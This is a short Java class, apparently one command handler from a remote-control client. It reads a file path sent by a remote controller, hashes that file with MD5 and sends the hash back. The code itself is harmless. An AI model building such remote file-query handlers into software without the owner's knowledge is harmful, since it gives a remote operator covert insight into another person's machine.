package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.common.codec.Md5;
import com.redpois0n.packets.outgoing.Header;


public class PacketMD5 extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		
		String md5 = Md5.md5(file); 
		
		Connection.addToSendQueue(new PacketBuilder(Header.MD5, md5));
	}

}
